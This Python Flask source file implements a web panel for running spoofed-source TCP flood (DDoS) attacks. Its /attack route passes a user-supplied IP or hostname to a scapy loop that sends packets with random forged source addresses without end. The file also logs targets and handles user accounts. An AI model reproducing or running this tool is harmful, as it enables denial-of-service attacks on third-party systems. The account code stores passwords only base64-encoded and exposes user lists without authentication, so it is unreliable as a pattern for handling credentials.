from operator import le
from flask import Flask, render_template, request
import sqlite3 as sql
import base64
import socket
from scapy.all import *


app = Flask(__name__)

p_o_e_O_r_N_mb_Pass = ''
u_ernm_e_Pass = ''
p_sW0d_Pass = ''


@app.route('/',  methods = ['GET'])
def main():
    return render_template('register.html')


@app.route('/login',  methods = ['GET'])
def login():
    return render_template('login.html')


@app.route('/personcontrol', methods = ['GET','POST'])
def personControl():
    
    if request.method == 'POST':
        p_o_e_O_r_N_mb = request.form.get('p_o_e_O_r_N_mb')
        n_eO_r_Sn_me = request.form.get('n_eO_r_Sn_me')
        n_eO_r_Sn_meSplit = n_eO_r_Sn_me.split()
        u_ernm_e = request.form.get('u_ernm_e')
        p_sW0d = request.form.get('p_sW0d')

        
        if(p_o_e_O_r_N_mb == '' or n_eO_r_Sn_me == '' or u_ernm_e == '' or p_sW0d == ''):
            return "Error: Do not leave the fields blank."
        else:

            p_o_e_O_r_N_mb_bytes = p_o_e_O_r_N_mb.encode('ascii')
            p_o_e_O_r_N_mb_base64_bytes = base64.b64encode(p_o_e_O_r_N_mb_bytes)
            
            p_o_e_O_r_N_mb_Pass = p_o_e_O_r_N_mb_base64_bytes.decode('ascii')
                
                
                
            n_eO_r_Sn_me_bytesNm = n_eO_r_Sn_meSplit[0].encode('ascii')
            n_eO_r_Sn_me_bytes_base64_bytesNm = base64.b64encode(n_eO_r_Sn_me_bytesNm)
            
            n_eO_r_Sn_me_PassNm = n_eO_r_Sn_me_bytes_base64_bytesNm.decode('ascii')
            
            
            
            n_eO_r_Sn_me_bytesSnme = n_eO_r_Sn_meSplit[1].encode('ascii')
            n_eO_r_Sn_me_bytes_base64_bytesSnme = base64.b64encode(n_eO_r_Sn_me_bytesSnme)
        
            n_eO_r_Sn_me_PassSnm = n_eO_r_Sn_me_bytes_base64_bytesSnme.decode('ascii')
                
                
                
            u_ernm_e_bytes = u_ernm_e.encode('ascii')
            u_ernm_e_base64_bytes = base64.b64encode(u_ernm_e_bytes)
            
            u_ernm_e_Pass = u_ernm_e_base64_bytes.decode('ascii')
                
                
                
            p_sW0d_bytes = p_sW0d.encode('ascii')
            p_sW0d_base64_bytes = base64.b64encode(p_sW0d_bytes)
        
            p_sW0d_Pass = p_sW0d_base64_bytes.decode('ascii')
            
            
            with sql.connect('membersOne.db') as memberOne:
                memberOneCursor = memberOne.cursor()
                memberOneCursor.execute("""SELECT * FROM members""")
                datas = memberOneCursor.fetchall()
                d = []
                
                for x in datas:
                    for i in x:
                        d.append(i)
                if p_o_e_O_r_N_mb_Pass in d and u_ernm_e_Pass in d and p_sW0d_Pass in d:
                    return render_template('ddos.html')
                else:
                    with sql.connect('membersTwo.db') as memberTwo:
                        h = []
                        memberTwoCursor = memberTwo.cursor()
                        memberTwoCursor.execute("""SELECT * FROM members""")
                        datas_ = memberTwoCursor.fetchall()
                            
                        for q in datas_:
                            for n in q:
                                h.append(n)
                        if p_o_e_O_r_N_mb_Pass in h and u_ernm_e_Pass in h and p_sW0d_Pass in h:
                            return render_template('ddos.html')
                        else:
                            return 'Intrusion Specified'
                                           

@app.route('/ddos', methods = ['GET','POST'])
def ddos():
    
    if request.method == 'POST':
        p_o_e_O_r_N_mb = request.form.get('p_o_e_O_r_N_mb')
        n_eO_r_Sn_me = request.form.get('n_eO_r_Sn_me')
        n_eO_r_Sn_meSplit = n_eO_r_Sn_me.split()
        u_ernm_e = request.form.get('u_ernm_e')
        p_sW0d = request.form.get('p_sW0d')
        
        if(p_o_e_O_r_N_mb == '' or n_eO_r_Sn_me == '' or u_ernm_e == '' or p_sW0d == ''):
            return "Error: Do not leave the fields blank."
        else:
            p_o_e_O_r_N_mb_bytes = p_o_e_O_r_N_mb.encode('ascii')
            p_o_e_O_r_N_mb_base64_bytes = base64.b64encode(p_o_e_O_r_N_mb_bytes)
            
            p_o_e_O_r_N_mb_Pass = p_o_e_O_r_N_mb_base64_bytes.decode('ascii')
                
                
                
            n_eO_r_Sn_me_bytesNm = n_eO_r_Sn_meSplit[0].encode('ascii')
            n_eO_r_Sn_me_bytes_base64_bytesNm = base64.b64encode(n_eO_r_Sn_me_bytesNm)
            
            n_eO_r_Sn_me_PassNm = n_eO_r_Sn_me_bytes_base64_bytesNm.decode('ascii')
            
            
            
            n_eO_r_Sn_me_bytesSnme = n_eO_r_Sn_meSplit[1].encode('ascii')
            n_eO_r_Sn_me_bytes_base64_bytesSnme = base64.b64encode(n_eO_r_Sn_me_bytesSnme)
            
            n_eO_r_Sn_me_PassSnm = n_eO_r_Sn_me_bytes_base64_bytesSnme.decode('ascii')
            
            
            
            u_ernm_e_bytes = u_ernm_e.encode('ascii')
            u_ernm_e_base64_bytes = base64.b64encode(u_ernm_e_bytes)
            
            u_ernm_e_Pass = u_ernm_e_base64_bytes.decode('ascii')
                
                
                
            p_sW0d_bytes = p_sW0d.encode('ascii')
            p_sW0d_base64_bytes = base64.b64encode(p_sW0d_bytes)
            
            p_sW0d_Pass = p_sW0d_base64_bytes.decode('ascii')

        

            d = []     
            if '@' not in p_o_e_O_r_N_mb:
                with sql.connect('membersOne.db') as membersOne:
                    membersOneCursor = membersOne.cursor()
                    membersOneCursor.execute("""SELECT * FROM members""")
                    datas = membersOneCursor.fetchall()
                    for x in datas:
                        for i in x:
                            d.append(i)

                        # username            # password
                    if  u_ernm_e_Pass in d or p_sW0d_Pass in d:
                        return 'There is someone who has this gmail. Try another.'
                    else:
                        with sql.connect('membersOne.db') as membersOne:
                            membersOneCursor = membersOne.cursor()
                            membersOneCursor.execute("""SELECT * FROM members""")
                            membersOneValues = membersOneCursor.fetchall()

                            if(len(membersOneValues) == 0):
                                i = str(1)
                                id_ = i.encode('ascii')
                                id_Info = base64.b64encode(id_)
                                id_Info_ = id_Info.decode('ascii')

                                membersOneCursor.execute("""CREATE TABLE IF NOT EXISTS members(id_ text,Number_,Name_,Surname,Username,Password_)""")
                                membersOneCursor.execute("""INSERT INTO members(id_,Number_,Name_,Surname,Username,Password_) VALUES(?,?,?,?,?,?)""", [id_Info_,p_o_e_O_r_N_mb_Pass, n_eO_r_Sn_me_PassNm, n_eO_r_Sn_me_PassSnm, u_ernm_e_Pass, p_sW0d_Pass])
                                
                                return render_template('ddos.html')
                            else:
                                t = str(len(membersOneValues)+ 1)
                                id_ = t.encode('ascii')
                                id_Info = base64.b64encode(id_)
                                id_Info_ = id_Info.decode('ascii')

                                membersOneCursor.execute("""CREATE TABLE IF NOT EXISTS members(id_ text,Gmail_,Name_,Surname,Username,Password_)""")
                                membersOneCursor.execute("""INSERT INTO members(id_,Number_,Name_,Surname,Username,Password_) VALUES(?,?,?,?,?,?)""", [id_Info_,p_o_e_O_r_N_mb_Pass, n_eO_r_Sn_me_PassNm, n_eO_r_Sn_me_PassSnm, u_ernm_e_Pass, p_sW0d_Pass])
                                return render_template('ddos.html')


            else:
                with sql.connect('membersTwo.db') as membersTwo:
                    cursorTwo = membersTwo.cursor()
                    cursorTwo.execute("""SELECT * FROM members""")
                    datas = cursorTwo.fetchall()
                    for x in datas:
                        for i in x:
                            d.append(i)
                    if p_o_e_O_r_N_mb_Pass in d and u_ernm_e_Pass in d and p_sW0d_Pass in d:
                            return 'There is someone who has this gmail. Try another.'
                    else:
                        with sql.connect('membersTwo.db') as membersTwo:
                            cursorTwo = membersTwo.cursor()
                            cursorTwo.execute("""SELECT * FROM members""")
                            membersTwoValues = cursorTwo.fetchall()
                    
                            if(len(membersTwoValues) == 0):
                                i = str(1)
                                id_ = i.encode('ascii')
                                id_Info = base64.b64encode(id_)
                                id_Info_ = id_Info.decode('ascii')

                                cursorTwo.execute("""CREATE TABLE IF NOT EXISTS members(id_ text,Gmail_,Name_,Surname,Username,Password_)""")
                                cursorTwo.execute("""INSERT INTO members(id_, Gmail_,Name_,Surname,Username,Password_) VALUES(?,?,?,?,?,?)""", [id_Info_,p_o_e_O_r_N_mb_Pass, n_eO_r_Sn_me_PassNm, n_eO_r_Sn_me_PassSnm, u_ernm_e_Pass, p_sW0d_Pass])
                                    
                                return render_template('ddos.html')
                            else:
                                t = str(len(membersTwoValues) + 1)
                                id_ = t.encode('ascii')
                                id_Info = base64.b64encode(id_)
                                id_Info_ = id_Info.decode('ascii')

                                cursorTwo.execute("""CREATE TABLE IF NOT EXISTS members(id_ text, Gmail_,Name_,Surname,Username,Password_)""")
                                cursorTwo.execute("""INSERT INTO members(id_, Gmail_,Name_,Surname,Username,Password_) VALUES(?,?,?,?,?,?)""", [id_Info_,p_o_e_O_r_N_mb_Pass, n_eO_r_Sn_me_PassNm, n_eO_r_Sn_me_PassSnm, u_ernm_e_Pass, p_sW0d_Pass])
                                    
                                return render_template('ddos.html')   


@app.route('/attack', methods = ['GET','POST'])
def attack():
    if request.method == 'POST':
        getTarget = request.form.get('i_p0_r_D0_inNme')
        srcPort = request.form.get('s_0r_c3_P0r_ct')
        dstPort = request.form.get('d3_st_P0r_ct')
        attackNum = request.form.get('a_tA_c_V4lE')
        attackSize = request.form.get('atA_C_S1z3')
        
        if(getTarget == '' or srcPort == '' or dstPort == '' or attackNum == '' or attackSize == ''):
            return "Error: Do not leave the fields blank."

        else:
            if(int(attackNum) > 0 and int(attackNum) < 40000):
                ddosAttack('', getTarget,srcPort,dstPort,attackNum,attackSize)
            else:
                return 'Please pay attention to the range of numbers you enter.'
    else:
        return 'Error'
    
    
@app.route('/stop', methods = ['GET','POST'])
def stop_():
    if request.method == 'POST':
        stopy = request.form.get('attack')  
        if(stopy == ''):
            return 'Please pay attention to the range of numbers you enter.'
        else:
            if(stopy == 'E'):
                ddosAttack(stopy,target_='',srcPort=1,dstPort=1,attack_Num=1,attackSize_=1)
                return render_template('ddosAttackStop.html')
            else:
                'Currently Attack Continues'
    else:
        return 'Error'

        
def ddosAttack(stop_s,target_,srcPort,dstPort,attack_Num,attackSize_):
    global target__
    target__ = target_
    if len(target_.split('.')) == 4:
        with sql.connect('targets-IP.db') as targetsIP:
            dest_ = target_
            targetsIPCursor = targetsIP.cursor()
            targetsIPCursor.execute("""CREATE TABLE IF NOT EXISTS targets_IP(destination_ip)""")
            targetsIPCursor.execute("""INSERT INTO targets_IP(destination_ip) VALUES(?)""", [str(dest_)])

            payload = 'xxx xxx xxx' * int(attackSize_)

            while True:
                srcIP = '.'.join(map(str,(random.randint(0,255) for _ in range(4))))
                #ip_txt.write(srcIP + "\n")
                spoofed_packet = IP(src = srcIP,dst = dest_) / TCP(sport = int(srcPort),dport = int(dstPort)) / payload
                for i in range(int(attack_Num)):
                    if target__ == '':
                        exit()
                    else:
                        send(spoofed_packet)

    else:
        with sql.connect('targets-URL.db') as targetsUrl:
            cursor = targetsUrl.cursor()
            if target_ == '':
                print('Null')
            else:
                cursor.execute("""CREATE TABLE IF NOT EXISTS targets_URL(destination_url)""")
                cursor.execute("""INSERT INTO targets_URL(destination_url) VALUES(?)""", [str(target_)])
                dest_ = socket.gethostbyname(target_)

                payload = 'xxx xxx xxx' * int(attackSize_)
                while True:
                    srcIP = '.'.join(map(str,(random.randint(0,255) for _ in range(4))))
                    #ip_txt.write(srcIP + "\n")
                    spoofed_packet = IP(src = srcIP,dst = dest_) / TCP(sport = int(srcPort),dport = int(dstPort)) / payload
                    for i in range(int(attack_Num)):
                        if target__ == '':
                            exit() 
                        else:
                            send(spoofed_packet)
                            
 
@app.route('/users1', methods = ['GET'] )
def users():
    info = []
    allInfo = []
    
    with sql.connect('membersOne.db') as membersOne:
        membersOneCursor = membersOne.cursor()
        membersOneCursor0bj = membersOneCursor.execute("""SELECT * FROM members""")
        users_ = membersOneCursor0bj.fetchall()

        for tupleİnfo in users_:
            for user in tupleİnfo:
                b_x_e_6_4_ = user
                b_x_e_6_4_bytes = b_x_e_6_4_.encode('ascii')
                b_x_e_6_4_bytes_ = base64.b64decode(b_x_e_6_4_bytes)
                bytes_ = b_x_e_6_4_bytes_.decode('ascii')
                info.append(bytes_)
            allInfo.append(info)
            info = []

        return render_template('users-1.html', users = allInfo)


@app.route('/users2', methods = ['GET'] )
def users2():
    info = []
    allInfo = []

    with sql.connect('membersTwo.db') as membersOne:
        membersOneCursor = membersOne.cursor()
        membersOneCursorObj = membersOneCursor.execute("""SELECT * FROM members""")
        users = membersOneCursorObj.fetchall()

        for tupleİnfo in users:
            for user in tupleİnfo:
                b_x_e_6_4_ = user
                b_x_e_6_4_bytes = b_x_e_6_4_.encode('ascii')
                b_x_e_6_4_bytes_ = base64.b64decode(b_x_e_6_4_bytes)
                bytes_ = b_x_e_6_4_bytes_.decode('ascii')
                info.append(bytes_)
            allInfo.append(info)
            info = []

        return render_template('users-2.html', users = allInfo)


@app.route('/admin', methods = ['GET','POST'])
def admin():
    return render_template('admin.html')


@app.route('/admin/login', methods = ['GET','POST'])
def adminLogin():
    if(request.method == "POST"):
        username = request.form.get('username')
        password = request.form.get('password')

        if(username =="" or password == ""):
            return "Error: Do not leave the fields blank."
        else:
            with sql.connect('admins.db') as admin:
                adminCursor = admin.cursor()
                adminCursor.execute("""CREATE TABLE IF NOT EXISTS admin (id text, username text, password_ text)""")
                adminCursor.execute("""SELECT * FROM admin""")

                adminCursorObj = adminCursor.fetchall()

                for adminInfo in adminCursorObj:
                    if(adminInfo[0] == username and adminInfo[1] == password):
                        info = []
                        allInfo = []

                        info2 = []
                        allInfo2 = []

                        with sql.connect('membersOne.db') as membersOne:
                            membersOneCursor = membersOne.cursor()
                            membersOneCursor0bj = membersOneCursor.execute("""SELECT * FROM members""")
                            users_ = membersOneCursor0bj.fetchall()

                            a = 0
                            for tupleİnfo in users_:
                                for user in tupleİnfo:
                                    b_x_e_6_4_ = user
                                    b_x_e_6_4_bytes = b_x_e_6_4_.encode('ascii')
                                    b_x_e_6_4_bytes_ = base64.b64decode(b_x_e_6_4_bytes)
                                    bytes_ = b_x_e_6_4_bytes_.decode('ascii')
                                    info.append(bytes_)
                                allInfo.append(info)
                                info = []

                        with sql.connect('membersTwo.db') as membersOne:
                            membersOneCursor = membersOne.cursor()
                            membersOneCursorObj = membersOneCursor.execute("""SELECT * FROM members""")
                            users = membersOneCursorObj.fetchall()
                            a = 0
                            for tupleİnfo in users:
                                for user in tupleİnfo:
                                    b_x_e_6_4_ = user
                                    b_x_e_6_4_bytes = b_x_e_6_4_.encode('ascii')
                                    b_x_e_6_4_bytes_ = base64.b64decode(b_x_e_6_4_bytes)
                                    bytes_ = b_x_e_6_4_bytes_.decode('ascii')
                                    info2.append(bytes_)
                                allInfo2.append(info2)
                                info2 = []


                        return render_template('totalUsers.html', users1 = allInfo, users2 = allInfo2)


                    else:
                        return 'Intrusion Specified'
    
    else:
        return "Method Not Allowed The method is not allowed for the requested URL."



@app.route('/delete/users1', methods = ['GET','POST'])
def deleteUser1():
    info = []
    allInfo = []

    if(request.method == "POST"):
        id_ = request.form.get('id')
        bytesId = id_.encode('ascii')
        bytesIdRes = base64.b64encode(bytesId)
        
        passId = bytesIdRes.decode('ascii')


        with sql.connect('membersOne.db') as membersOne:
            membersOneCursor = membersOne.cursor()
            sql__ = """DELETE FROM members WHERE id_ = ?"""
            membersOneCursor.execute(sql__, (passId,))
            membersOneCursor0bj = membersOneCursor.execute("""SELECT * FROM members""")
            users_ = membersOneCursor0bj.fetchall()

            for tupleİnfo in users_:
                for user in tupleİnfo:
                    b_x_e_6_4_ = user
                    b_x_e_6_4_bytes = b_x_e_6_4_.encode('ascii')
                    b_x_e_6_4_bytes_ = base64.b64decode(b_x_e_6_4_bytes)
                    bytes_ = b_x_e_6_4_bytes_.decode('ascii')
                    info.append(bytes_)


                allInfo.append(info)
                info = []


            return render_template('users-1.html', users = allInfo)
        
        return "Error"


@app.route('/delete/users2', methods = ['GET','POST'])
def deleteUser2():
    info = []
    allInfo = []

    if(request.method == "POST"):
        id_ = request.form.get('id')
        bytesId = id_.encode('ascii')
        bytesIdRes = base64.b64encode(bytesId)
        
        passId = bytesIdRes.decode('ascii')


        with sql.connect('membersTwo.db') as membersTwo:
            membersTwoCursor = membersTwo.cursor()
            sql__ = """DELETE FROM members WHERE id_ = ?"""
            membersTwoCursor.execute(sql__, (passId,))
            membersTwoCursor0bj = membersTwoCursor.execute("""SELECT * FROM members""")
            users_ = membersTwoCursor0bj.fetchall()

            for tupleİnfo in users_:
                for user in tupleİnfo:
                    b_x_e_6_4_ = user
                    b_x_e_6_4_bytes = b_x_e_6_4_.encode('ascii')
                    b_x_e_6_4_bytes_ = base64.b64decode(b_x_e_6_4_bytes)
                    bytes_ = b_x_e_6_4_bytes_.decode('ascii')
                    info.append(bytes_)


                allInfo.append(info)
                info = []


            return render_template('users-2.html', users = allInfo)
        
        return "Error"



if __name__ == '__main__':
    app.run(port=5000, debug=True) 
    
    
